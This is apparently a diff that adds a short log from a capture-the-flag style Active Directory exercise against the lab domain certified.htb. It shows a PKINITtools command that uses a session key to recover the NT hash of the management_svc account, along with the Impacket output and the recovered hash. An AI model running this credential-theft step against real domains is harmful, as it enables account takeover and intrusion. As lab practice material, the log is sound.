@@ -1,0 +1,13 @@
+### [2026-04-06 06:41:52] python3 PKINITtools/getnthash.py -key 3af33800da6418f57e3e0a96259c2e619e8e9f1ea37f298fd9552ece77472853 certified.htb/management_svc
+
+$ python3 PKINITtools/getnthash.py -key 3af33800da6418f57e3e0a96259c2e619e8e9f1ea37f298fd9552ece77472853 certified.htb/management_svc
+
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Using TGT from cache
+[*] Requesting ticket to self with PAC
+Recovered NT Hash
+a091c1832bcdd4677c28b5a6a1295584
+
+# Exit code: 0
+# Duration: 2026-04-06 06:41:52
